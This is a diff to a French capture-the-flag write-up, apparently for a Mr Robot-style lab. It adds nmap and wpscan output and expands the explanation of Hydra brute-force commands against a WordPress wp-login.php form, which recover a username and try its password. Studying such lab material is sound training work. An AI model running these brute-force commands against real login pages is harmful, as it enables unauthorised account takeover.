@@ -46,6 +46,41 @@ Pour ce faire, nous pouvons utiliser la commande suivante :
 
 ```bash
 nmap -A -oN scan.txt -oX scan.xml target
+Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-08-02 10:15 CEST
+Nmap scan report for target (10.10.135.61)
+Host is up (0.10s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 c8:44:28:46:f2:4a:51:09:4b:76:5a:45:0c:a2:7a:b8 (RSA)
+|   256 1f:ab:d3:fe:aa:c3:2c:17:82:eb:58:88:7d:15:cf:8f (ECDSA)
+|_  256 41:46:fe:c9:af:b1:f3:e6:3a:52:71:7b:04:92:9b:a3 (ED25519)
+80/tcp  open  http     Apache httpd
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache
+443/tcp open  ssl/http Apache httpd
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
+OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
+Aggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   93.73 ms 10.8.0.1
+2   92.49 ms target (10.10.135.61)
+
+OS and Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
+Nmap done: 1 IP address (1 host up) scanned in 46.49 seconds
 ```
 
 **Explication de la commande** : Nous commençons un scan Nmap en utilisant le modèle agressif (`-A`), puis nous spécifions d'enregistrer le résultat dans deux fichiers nommés respectivement `scan.xml` et `scan.txt` — un fichier XML en utilisant le flag `-oX` et un fichier texte avec le flag `-oN`.
@@ -93,7 +128,16 @@ Pour nous assurer de ne rien manquer d'intéressant pendant notre phase d'énum�
 
 ```bash
 nmap -sS --min-rate=1500 -p- target
+Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-08-03 11:25 CEST
+Nmap scan report for target (10.10.135.61)
+Host is up (0.052s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
 
+Nmap done: 1 IP address (1 host up) scanned in 75.65 seconds
 ```
 
 **Note : Ici l’option `--min-rate=1500` permet d’accélerer le scan.**
@@ -198,17 +242,108 @@ Voyons si nous pouvons accéder à ceux-ci en utilisant notre navigateur.
 
 Parfait ! Nous avons obtenu notre première clé → `073403c8a58a1f80d943455fb30724b9` facile, non ?
 
-En vérifiant l'autre fichier, il semble être un fichier dictionnaire ou une liste de mots → Il pourrait être utile pour une attaque par force brute → Téléchargeons-le en utilisant curl au cas où.
+En vérifiant l'autre fichier, il semble être un fichier dictionnaire ou une liste de mots → Il pourrait être utile pour une attaque par bruteforce → Téléchargeons-le en utilisant curl au cas où.
 
 ```bash
 curl <http://target/fsocity.dic> -o fsocity.dic
-
+ls
+fsocity.dic scan.txt scan.xml
 ```
 
 Comme nous le savons déjà, le site web utilise WordPress, alors effectuons un simple wpscan pour voir si nous pouvons obtenir plus d'informations.
 
 ```bash
-wpscan --url <http://target/>
+wpscan --url http://target/     
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://target/ [10.10.27.172]
+[+] Started: Sat Aug  2 10:38:27 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://target/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://target/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] The external WP-Cron seems to be enabled: http://target/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://target/5d0fee7.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://target/5d0fee7.html, Match: 'WordPress 4.3.1'
+
+[+] WordPress theme in use: twentyfifteen
+ | Location: http://target/wp-content/themes/twentyfifteen/
+ | Last Updated: 2025-04-15T00:00:00.000Z
+ | Readme: http://target/wp-content/themes/twentyfifteen/readme.txt
+ | [!] The version is out of date, the latest version is 4.0
+ | Style URL: http://target/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen/
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://target/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:04 <========================================> (137 / 137) 100.00% Time: 00:00:04
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sat Aug  2 10:38:43 2025
+[+] Requests Done: 173
+[+] Cached Requests: 6
+[+] Data Sent: 40.479 KB
+[+] Data Received: 278.06 KB
+[+] Memory used: 264.734 MB
+[+] Elapsed time: 00:00:15
 ```
 
 Bien, nous avons maintenant de nouvelles informations :
@@ -218,7 +353,7 @@ Bien, nous avons maintenant de nouvelles informations :
 
 J'ai fait quelques recherches mais je n'ai rien trouvé d'utile pour nous.
 
-Ensuite, je me suis souvenu qu'il y avait une page wp-login. Voyons si nous pouvons effectuer une attaque par force brute en utilisant Hydra !
+Ensuite, je me suis souvenu qu'il y avait une page wp-login. Voyons si nous pouvons effectuer une attaque par bruteforce en utilisant Hydra !
 
 Tout d'abord, envoyons une requête de test et interceptons-la en utilisant Burp Suite et l'extension de navigateur FoxyProxy.
 
@@ -241,7 +376,11 @@ Pour les supprimer, nous pouvons utiliser la commande suivante :
 sort fsocity.dic | uniq > fsocity_uniq.dic
 ```
 
-Ici, nous trions d'abord le fichier `fsocity.dic`, puis, en utilisant la commande `uniq`, nous supprimons tous les doublons de la sortie précédente en utilisant un pipe `|`.
+Ici, nous trions d'abord le fichier `fsocity.dic`, puis, en utilisant la commande `uniq`, nous supprimons tous les doublons de la sortie précédente en utilisant un pipe `|`. Vous constaterez que le nombre de mots diminuera considérablement, passant de 858 160 lignes à 11 451 — un gain considérable !
+
+Cela n'affecte pas le résultat de l'attaque par bruteforce, mais seulement ses performances. Nous ne voulons pas que notre attaque par bruteforce essaie 846 709 identifiants deux fois (ou plus !).
+
+Bref, lançons l'attaque par bruteforce maintenant pour vérifier si nous pouvons récupérer un nom d'utilisateur. Si c'est le cas, nous devrions faire de même pour le mot de passe.
 
 ```bash
 hydra -L fsocity_uniq.dic -p test target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget%2Fwp-admin%2F&testcookie=1:F=Invalid username" -t 64
@@ -261,11 +400,11 @@ Hydra (<https://github.com/vanhauser-thc/thc-hydra>) starting at 2025-08-03 12:0
 
 **Explication de la commande :**
 
-- `L` : Drapeau utilisé pour spécifier un fichier dictionnaire de noms d'utilisateur → effectue une force brute sur le nom d'utilisateur
+- `L` : Drapeau utilisé pour spécifier un fichier dictionnaire de noms d'utilisateur → effectue une bruteforce sur le nom d'utilisateur
 - `p` : Drapeau utilisé pour spécifier un mot de passe statique → le mot de passe ne changera pas
 - `target` : Adresse IP ou nom de domaine de la cible
-- `http-post-form` : Module utilisé pour effectuer la force brute → Nous essayons de nous connecter via une requête HTTP POST
-- `t 64` : Drapeau utilisé pour spécifier un nombre de threads (parallélisation de la force brute) → pour effectuer plus d'essais par tâche.
+- `http-post-form` : Module utilisé pour effectuer la bruteforce → Nous essayons de nous connecter via une requête HTTP POST
+- `t 64` : Drapeau utilisé pour spécifier un nombre de threads (parallélisation de la bruteforce) → pour effectuer plus d'essais par tâche.
 
 **Note : La partie `"/wp-login.php:log=^USER^&pwd=^PASS^...` peut faire peur au premier abord mais en réalité elle suit simplement la syntaxe suivante : `"<url>:<post_data>:<failure_string>"`.**
 
@@ -279,7 +418,7 @@ Lien utile : [Hydra HTTP post form module](https://labex.io/tutorials/hydra-expl
 
 Super ! Un utilisateur elliot semble exister et nous pouvons également noter que la casse n'est pas importante.
 
-Maintenant que nous avons un nom d'utilisateur disponible sur le site WordPress, peut-être pouvons-nous forcer son mot de passe aussi, non ? Essayons de le faire !
+Maintenant que nous avons un nom d'utilisateur disponible sur le site WordPress, peut-être que nous pouvons bruteforcer son mot de passe aussi, non ? Essayons de le faire !
 
 ```bash
 hydra -l elliot -P fsocity_uniq.dic target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget%2Fwp-admin%2F&testcookie=1:F=The password you entered" -t 64 -I
